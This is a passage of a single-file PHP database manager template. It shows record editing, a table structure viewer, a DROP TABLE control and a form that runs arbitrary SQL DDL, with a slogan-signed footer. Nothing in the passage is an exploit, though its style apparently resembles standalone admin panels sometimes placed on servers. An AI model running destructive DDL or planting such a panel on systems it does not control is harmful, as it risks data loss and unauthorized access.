                                <b><?=htmlspecialchars($field)?></b> (<?=htmlspecialchars($field_info['Type'])?><?= $is_pk ? ', PK' : '' ?><?= $is_ai ? ', Auto' : '' ?>):
                                <input type="text" name="<?=htmlspecialchars($field)?>" value="<?=htmlspecialchars($value)?>" <?= $is_pk && $action === 'edit' ? 'readonly' : '' ?>>
                            </label>
                            <?php endif; ?>
                        <?php endforeach; ?>
                        <button type="submit" name="save_record">Save Record</button>
                        <a href="?page=manager&table=<?=htmlspecialchars($table_name)?>&action=list&p=<?= $page_num ?>" style="background:#555;color:#fff;padding:9px 28px;font-size:1em;border-radius:7px;text-decoration:none;margin-left:15px;display:inline-block;">Cancel</a>
                    </form>
                <?php endif; ?>
            <?php endif; ?>

        <?php elseif ($page === 'structure' && isset($_SESSION['host'], $_SESSION['user'], $_SESSION['db'])): ?>
            <div class="topbar"><a class="logout" href="?logout=1">Logout</a></div>
            <div style="margin-bottom:20px;color:#ffb3b3;font-size:0.98em;">
                **DATABASE STRUCTURE MANAGER (DDL)** | Connected to <b><?=htmlspecialchars($_SESSION['db'])?></b>
            </div>
            
            <?php if ($error): ?>
                <div class="err"><?=htmlspecialchars($error)?></div>
            <?php endif; ?>
            
            <div class="crud-actions">
                <a href="?page=query" style="background:#ff8c00;color:#fff;padding:9px 28px;border-radius:7px;text-decoration:none;">SQL Query</a>
                <a href="?page=manager&table=" style="background:#00aaff;color:#fff;padding:9px 28px;border-radius:7px;text-decoration:none;">Data Manager (CRUD)</a>
                <a href="?page=structure&action=create_table" style="background:#00cc88;color:#fff;padding:9px 28px;border-radius:7px;text-decoration:none;">+ CREATE New Table</a>
            </div>
            
            <?php if (isset($structure_result)) echo $structure_result; ?>

            <?php if ($structure_action === 'list'): ?>
                <label style="width: 250px;">Select Table to View Structure:</label>
                <select onchange="window.location='?page=structure&table='+this.value">
                    <option value="">-- All Tables (<?=count($tables_list)?>) --</option>
                    <?php foreach($tables_list as $t): ?>
                        <option value="<?=htmlspecialchars($t)?>" <?= (isset($structure_table) && $t === $structure_table) ? 'selected' : ''?>><?=htmlspecialchars($t)?></option>
                    <?php endforeach; ?>
                </select>

                <?php if (isset($structure_table) && $structure_table): ?>
                    <h3 style="margin-top:20px;">Structure for Table: `<?=htmlspecialchars($structure_table)?>`</h3>
                    <div style="overflow-x:auto;">
                        <table>
                            <thead><tr>
                                <th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th><th>Action</th>
                            </tr></thead>
                            <tbody>
                                <?php foreach ($table_fields as $col): ?>
                                    <tr>
                                        <td><?=htmlspecialchars($col['Field'])?></td>
                                        <td><?=htmlspecialchars($col['Type'])?></td>
                                        <td><?=htmlspecialchars($col['Null'])?></td>
                                        <td><?=htmlspecialchars($col['Key'])?></td>
                                        <td><?=htmlspecialchars($col['Default'])?></td>
                                        <td><?=htmlspecialchars($col['Extra'])?></td>
                                        <td>
                                            <a href="?page=structure&table=<?=htmlspecialchars($structure_table)?>&action=alter_column&col=<?=htmlspecialchars($col['Field'])?>" style="color:#00ff88; text-decoration: none;">Edit Column</a>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    <div style="margin-top:15px; text-align:right;">
                        <a href="javascript:void(0)" onclick="if(confirm('WARNING! Are you absolutely sure you want to DROP table <?=htmlspecialchars($structure_table)?>? Data will be lost!')) window.location='?page=structure&table=<?=htmlspecialchars($structure_table)?>&action=drop_table'" style="background:#c00;color:#fff;padding:7px 15px;border-radius:7px;text-decoration:none;font-weight:bold;">DROP TABLE</a>
                        <a href="?page=structure&table=<?=htmlspecialchars($structure_table)?>&action=alter_column" style="background:#555;color:#fff;padding:7px 15px;border-radius:7px;text-decoration:none;">+ Add/Modify Column</a>
                    </div>

                <?php endif; ?>
            <?php elseif ($structure_action === 'create_table' || $structure_action === 'alter_column'): ?>
                <h3><?= $structure_action === 'create_table' ? 'CREATE New Table' : 'Execute ALTER/ADD/RENAME' ?></h3>
                <form method="post">
                    <label>
                        <b>SQL DDL Query:</b>
                        <textarea name="ddl_query" rows="6" placeholder="Contoh: CREATE TABLE users (id INT PRIMARY KEY AUTO_INCREMENT, name VARCHAR(100) NOT NULL);
Contoh: ALTER TABLE my_table ADD COLUMN new_col DECIMAL(10,2);
Contoh: ALTER TABLE my_table CHANGE old_col new_col VARCHAR(50);
Contoh: DROP TABLE another_table;
"><?=htmlspecialchars(isset($_POST['ddl_query']) ? $_POST['ddl_query'] : '')?></textarea>
                    </label>
                    <button type="submit" name="run_ddl">Execute DDL</button>
                    <a href="?page=structure" style="background:#555;color:#fff;padding:9px 28px;font-size:1em;border-radius:7px;text-decoration:none;margin-left:15px;display:inline-block;">Cancel</a>
                </form>
            <?php endif; ?>
        <?php endif; ?>
    </div>
    <div class="footer">
        &copy; <?=date('Y')?> S-Dacosta | <b>Burn FACISM!</b>
    </div>
</body>
</html>
